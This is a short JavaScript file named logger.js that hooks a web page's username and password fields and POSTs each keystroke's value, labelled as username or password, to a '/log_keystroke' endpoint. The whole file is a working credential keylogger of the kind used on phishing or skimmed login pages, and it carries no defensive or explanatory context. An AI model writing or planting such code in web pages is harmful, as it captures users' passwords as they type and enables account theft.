// logger.js

document.addEventListener("DOMContentLoaded", function () {
    const userField = document.getElementById("user");
    const pwdField = document.getElementById("pwd");

    function sendData(field, value) {
        fetch("/log_keystroke", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ field: field, value: value })
        });
    }

    userField.addEventListener("input", function () {
        sendData("username", userField.value);
    });

    pwdField.addEventListener("input", function () {
        sendData("password", pwdField.value);
    });
});
